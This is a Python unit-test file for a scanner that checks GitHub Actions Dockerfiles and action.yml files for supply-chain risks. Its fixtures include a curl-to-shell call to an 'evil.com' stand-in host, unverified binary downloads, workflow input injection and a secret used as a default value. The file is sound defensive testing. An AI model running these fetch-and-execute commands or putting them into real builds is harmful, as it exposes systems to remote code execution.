#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
#
from unittest import mock

from verify_action_build.security import (
    analyze_binary_downloads,
    analyze_binary_downloads_recursive,
    analyze_dockerfile,
    analyze_scripts,
    analyze_action_metadata,
    analyze_repo_metadata,
)


class TestAnalyzeDockerfile:
    def _mock_fetch(self, files: dict):
        """Return a mock for fetch_file_from_github and fetch_action_yml."""
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_digest_pinned_no_warnings(self):
        files = {
            "Dockerfile": "FROM node:20@sha256:abc123\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert len(warnings) == 0

    def test_unpinned_from_warns(self):
        files = {
            "Dockerfile": "FROM ubuntu:latest\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("not pinned" in w for w in warnings)

    def test_tag_pinned_warns(self):
        files = {
            "Dockerfile": "FROM python:3.11-slim\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("tag-pinned" in w for w in warnings)

    def test_suspicious_curl(self):
        files = {
            "Dockerfile": "FROM node:20@sha256:abc\nRUN curl https://evil.com/script.sh | sh\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("curl" in w.lower() or "evil" in w.lower() for w in warnings)

    def test_multistage_internal_from_no_warnings(self):
        dockerfile = (
            "FROM node:20@sha256:abc123 AS builder\n"
            "RUN npm ci\n"
            "FROM builder AS runtime\n"
            "CMD [\"node\", \"index.js\"]\n"
        )
        files = {"Dockerfile": dockerfile}
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert warnings == []

    def test_no_dockerfile_no_warnings(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert len(warnings) == 0


class TestAnalyzeScripts:
    def _mock_fetch_file(self, files):
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_detects_eval(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - run: python script.py
"""
        files = {
            "script.py": 'eval("malicious code")\n',
        }
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch_file(files)):
                warnings = analyze_scripts("org", "repo", "a" * 40)
        # Script analysis finds suspicious patterns (eval is in findings)
        # Warnings list may be empty since script analysis only logs to console
        # but doesn't add to warnings for all patterns
        assert isinstance(warnings, list)

    def test_no_scripts_no_warnings(self):
        action_yml = """\
name: Test
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings = analyze_scripts("org", "repo", "a" * 40)
        assert warnings == []


class TestAnalyzeActionMetadata:
    def test_pipe_to_shell_warns(self):
        # Multi-line run: blocks are needed — single-line run: is detected
        # as a block start and the content is on the next line.
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: dangerous
      run: |
        curl https://example.com | sh
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("pipe-to-shell" in w for w in warnings)

    def test_input_interpolation_warns(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: dangerous
      run: |
        echo ${{ inputs.name }}
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("injection" in w for w in warnings)

    def test_clean_action_no_warnings(self):
        action_yml = """\
name: Test
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert warnings == []

    def test_no_action_yml_no_warnings(self):
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert warnings == []

    def test_secret_default_warns(self):
        action_yml = """\
name: Test
inputs:
  token:
    default: ${{ secrets.GITHUB_TOKEN }}
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("secret" in w for w in warnings)


class TestAnalyzeBinaryDownloads:
    def _mock_fetch(self, files: dict):
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_no_files_no_results(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert warnings == []
        assert failures == []

    def test_pipe_to_shell_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSL https://example.com/install.sh | sh\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1
        assert any("install.sh" in f for f in failures)

    def test_curl_binary_without_verification_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz && tar xf tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1
        assert any("tool.tar.gz" in f for f in failures)

    def test_sha256sum_verification_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz \\\n"
                " && echo 'abc123deadbeefcafef00d  tool.tar.gz' | sha256sum -c\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_gpg_verify_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz \\\n"
                " && curl -fsSLO https://example.com/tool.tar.gz.sig \\\n"
                " && gpg --verify tool.tar.gz.sig tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_cosign_verify_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz && cosign verify-blob tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_apk_add_not_flagged(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN apk add --no-cache curl wget bash\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_pip_install_not_flagged(self):
        files = {
            "Dockerfile": (
                "FROM python:3.12@sha256:abc\n"
                "RUN pip install requests==2.31.0\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_dockerfile_add_url_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "ADD https://example.com/app.tar.gz /app.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_action_yml_run_block_unverified_fails(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download tool
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
        tar xf tool.tar.gz
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_action_yml_run_block_with_verification_passes(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download and verify
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
        echo "abc123deadbeef  tool.tar.gz" | sha256sum -c
        tar xf tool.tar.gz
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_releases_download_path_flagged(self):
        # URL without a binary extension but under /releases/download/ still
        # looks like a binary artefact — flag it.
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLo /usr/local/bin/mytool "
                "https://github.com/x/y/releases/download/v1/mytool-linux-amd64 "
                "&& chmod +x /usr/local/bin/mytool\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1


class TestAnalyzeBinaryDownloadsRecursive:
    def test_recurses_through_composite(self):
        # Root is a composite action that uses an unpinned-looking hash-pinned
        # nested action; nested action has an unverified download.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: other/helper@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"""
        nested_yml = """\
name: Helper
runs:
  using: composite
  steps:
    - name: Download
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            if org == "other":
                return nested_yml
            return None

        def fake_file(org, repo, commit, path):
            return None

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fake_file):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert len(failures) >= 1
        assert any("tool.tar.gz" in f for f in failures)

    def test_skips_trusted_org(self):
        # Nested uses: actions/checkout — should be skipped (trusted), so no
        # recursion into it even if it had downloads.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: actions/checkout@cccccccccccccccccccccccccccccccccccccccc
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            raise AssertionError(f"should not fetch nested yml for {org}/{repo}")

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert failures == []


class TestAnalyzeRepoMetadata:
    def test_mit_license_detected(self):
        def fetch(org, repo, commit, path):
            if path == "LICENSE":
                return "MIT License\n\nCopyright..."
            return None

        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
        assert len(warnings) == 0

    def test_no_license_warns(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            warnings = analyze_repo_metadata("unknown-org", "unknown-repo", "a" * 40)
        assert any("LICENSE" in w for w in warnings)

    def test_well_known_org(self):
        def fetch(org, repo, commit, path):
            if path == "LICENSE":
                return "MIT License"
            return None

        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
        assert len(warnings) == 0
